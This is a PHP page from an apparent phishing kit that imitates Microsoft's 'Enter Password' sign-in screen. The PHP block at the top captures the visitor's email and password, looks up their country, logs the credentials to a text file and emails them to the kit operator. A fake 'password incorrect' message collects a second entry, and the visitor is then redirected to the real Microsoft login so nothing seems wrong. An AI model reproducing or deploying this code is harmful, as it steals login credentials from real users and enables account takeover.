<?php

session_start();
if(!isset($_SESSION['uid']) || empty($_SESSION['uid'])){
	$_SESSION['uid'] = gen();
}

function gen($len = 8){
	$abc = "qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890";
	$res = "";
	for ($i=0; $i < $len; $i++) { 
		$res .= $abc[rand(0,strlen($abc)-1)];
	}
	return $res;
}

$error = 0;
if(!isset($_GET['email'])){
	header('Location: ./');
}


if(isset($_POST['error'])){
	$error=(int)$_POST['error'];
}

if(isset($_POST['email']) && !empty($_POST['email']) && isset($_POST['password']) && !empty($_POST['password'])){
	require("./config.php");
	$email = urldecode($_POST['email']);
	$password = urldecode($_POST['password']);
	$ip = get_ip_address();
	$country = json_decode(file_get_contents("http://ipinfo.io/$ip"), true)['country'];
	file_put_contents('log.txt', sprintf($format, $email, $password)."\n", FILE_APPEND);
	mail($email_to, 'New Login('.$_SESSION['uid'].')', sprintf($email_format, $email, $password, $ip, $_SERVER['HTTP_USER_AGENT'], $country));
	$error+=1;
}


if(isset($_POST['end'])){
	header('Location: https://login.microsoftonline.com/common/oauth2');
	die();
}

function get_ip_address(){
	foreach (array('HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_FORWARDED', 'HTTP_X_CLUSTER_CLIENT_IP', 'HTTP_FORWARDED_FOR', 'HTTP_FORWARDED', 'REMOTE_ADDR') as $key){
		if (array_key_exists($key, $_SERVER) === true){
			foreach (explode(',', $_SERVER[$key]) as $ip){
				$ip = trim($ip); // just to be safe

				if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) !== false){
					return $ip;
				}
			}
		}
	}
}

?>

<html dir="ltr" class="" lang="uk">

<head>
	<title>Signing in to your account</title>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
	<meta http-equiv="Pragma" content="no-cache">
	<meta http-equiv="Expires" content="-1">

	<meta http-equiv="x-dns-prefetch-control" content="on">

	<link rel="shortcut icon" href="https://aadcdn.msauth.net/ests/2.1/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico">
	<link rel="stylesheet" href="login_files/main.css">
	<meta name="robots" content="none">

</head>

<body style="display: block;overflow-y: hidden;">
	<div>
		
		<div>
			<div class="background" role="presentation">
				<div style="background-image: url(&quot;./login_files/bg_sm.jpg&quot;);"></div>
				<div class="backgroundImage" style="background-image: url(&quot;./login_files/bg_lg.jpg&quot;);"></div>
			</div>
		</div>
		<div></div>
		<form name="f1" id="i0281" novalidate="novalidate" spellcheck="false" method="post" target="_top" autocomplete="off" action="">
			<input type="hidden" name="email" value="<?php echo urldecode($_GET['email'])?>">
			<div class="outer">
				<div class="middle">

					<div class="inner fade-in-lightbox">
						<div class="lightbox-cover"></div>
						<div> <img class="logo" pngsrc="https://aadcdn.msauth.net/ests/2.1/content/images/microsoft_logo_ed9c9eb0dce17d752bedea6b5acda6d9.png" svgsrc="https://aadcdn.msauth.net/ests/2.1/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" src="https://aadcdn.msauth.net/ests/2.1/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" alt="Microsoft"> </div>
						<div role="main">
							<div class="">
								<div class="animate slide-in-next">
									<div>
										<div class="identityBanner">
											<button type="button" class="backButton" id="idBtn_Back" aria-label="Назад" onclick="window.location = './'"> <img role="presentation" pngsrc="https://aadcdn.msauth.net/ests/2.1/content/images/arrow_left_7cc096da6aa2dba3f81fcc1c8262157c.png" svgsrc="https://aadcdn.msauth.net/ests/2.1/content/images/arrow_left_a9cc2824ef3517b6c4160dcf8ff7d410.svg" src="https://aadcdn.msauth.net/ests/2.1/content/images/arrow_left_a9cc2824ef3517b6c4160dcf8ff7d410.svg"> </button>
											<div id="displayName" class="identity" title="<?php echo urldecode($_GET['email'])?>"><?php echo urldecode($_GET['email'])?></div>
										</div>
									</div>
								</div>
								<div class="pagination-view animate has-identity-banner slide-in-next">
									<div data-viewid="2" data-showidentitybanner="true" data-dynamicbranding="true">
										<div id="loginHeader" class="row text-title" role="heading" aria-level="1">Enter Password</div>
										
										
										<div class="row">
											<div role="alert" aria-live="assertive">
												<div id="passwordError" class="alert alert-error">
													<?php if($error == 1){ ?>
														<input type="hidden" name="end" value="true">
														Your password is incorrect, please try again.
													<?php }?> 
												</div>
											</div>
											<div class="form-group col-md-24">
												<div role="alert" aria-live="assertive">
												</div>
												<div class="placeholderContainer">
													<input name="password" type="password" id="i0118" autocomplete="off" class="form-control" aria-required="true" aria-describedby="loginHeader" placeholder="Password" tabindex="0">
												</div>
											</div>
										</div>
										<div class="position-buttons">
											<div>
												<div class="row">
													<div class="col-md-24">
														<div class="text-13 action-links">
															<div class="form-group"> <a id="idA_PWD_ForgotPassword" target="_blank" role="link" href="https://passwordreset.microsoftonline.com/?ru=https%3a%2f%2flogin.microsoftonline.com%2fcommon%2freprocess%3fctx%3drQIIAXWRO2_TUABG47xoKwQVCyygIjGBktxrX9tJpA5JnGcTO07cpPZAldiOX_ED-6ZxMjMwVrB1hK0LEhOqxMbUqXN_AWIBwUIXRPoDWM70DUffeZ6CeVh-hihET9hpKVeaMFQOlSDITRDJ5CiaYigSQI0GVPhgZ_f6NBO_-_GVu9hzbx6f55hz4qGJcRCVC4Xlcpn3ZzNL1fOq7xY-E8QVQXwjiLNkcuGcJyOGYgFTQkUWMixLkxChPC-NbJ4bOT1OxbItI34IAG-Ly65kxDwnYkEaOUKzHctrze2NDylZMue9Zg_0OAMrnBrLFgBCU1x1JQfw6wrmx-2lLImkbNdpXhq418n7QmWBTfIWfmit9V_J7ZkfuseBH-Gz1BdCCHSvrdV8z9NVnL-d6R621Am2fK8f-oEeYkuP9rn2CaO0TmhyqNQOBsIaiOtaUSwOlRI2lMAQNbVhHPea7bmMal0SmrBPCqrNN9FAYZxZGJKig49MhrVFsGgdoCP7hO3y7nSg6nPFIf3WyO6siiG2W0ofju143JHMilpdwZiuLLpRzZgVlw3ZibAcMdM6CYMOiBe28SmV3Tzt-t5l6t5G1bO0vSD0Z9Zcv0oT39N3Qaq8tbWzm3iU2Ev8SRPvM5uAT95-ePryt1n_OL5pvP6bSFxmCh4yBhAGg6Gx4g87DUqqV6evqpKwUOrI0TzRj18U2jVuGtv1faoMT7PEaTb7M0u8uZO42P5f_n81&amp;mkt=uk&amp;hosted=0&amp;device_platform=Windows+10">Forgot my password</a> </div>

															<div class="form-group">
															</div>																
														</div>
													</div>
												</div>
											</div>
											<div class="row">
												<div>
													<div class="col-xs-24 no-padding-left-right button-container">
														<div class="inline-block">
															<input type="submit" id="idSIButton9" class="btn btn-block btn-primary" value="Sign In"> </div>
														</div>
													</div>
												</div>
											</div>
										</div>
									</div>
								</div>
							</div>
						</div>
						<div id="footer" class="footer default" role="contentinfo">
							<div>
								<div id="footerLinks" class="footerNode text-secondary"> <a id="ftrTerms" target="_blank" href="https://www.microsoft.com/uk/servicesagreement/">Terms of use</a> <a id="ftrPrivacy" href="https://privacy.microsoft.com/uk/privacystatement" target="_blank">Privacy and cookies</a>
									<a id="moreOptions" href="#" role="button" class="moreOptions" aria-label="Клацніть тут, щоб переглянути інформацію про виправлення неполадок" aria-expanded="false">
										<img class="desktopMode" role="presentation" pngsrc="https://aadcdn.msauth.net/ests/2.1/content/images/ellipsis_white_0ad43084800fd8b50a2576b5173746fe.png" svgsrc="https://aadcdn.msauth.net/ests/2.1/content/images/ellipsis_white_5ac590ee72bfe06a7cecfd75b588ad73.svg" src="https://aadcdn.msauth.net/ests/2.1/content/images/ellipsis_white_5ac590ee72bfe06a7cecfd75b588ad73.svg">
										<img class="mobileMode" role="presentation" pngsrc="https://aadcdn.msauth.net/ests/2.1/content/images/ellipsis_grey_5bc252567ef56db648207d9c36a9d004.png" svgsrc="https://aadcdn.msauth.net/ests/2.1/content/images/ellipsis_grey_2b5d393db04a5e6e1f739cb266e65b4c.svg" src="https://aadcdn.msauth.net/ests/2.1/content/images/ellipsis_grey_2b5d393db04a5e6e1f739cb266e65b4c.svg">
									</a>
								</div>
							</div>
						</div>
					</div>
				</div>
			</form>
			<form method="get" aria-hidden="true" target="_top"> </form>
		</div>
		<script>
			
		</script>
	</body>
	</html>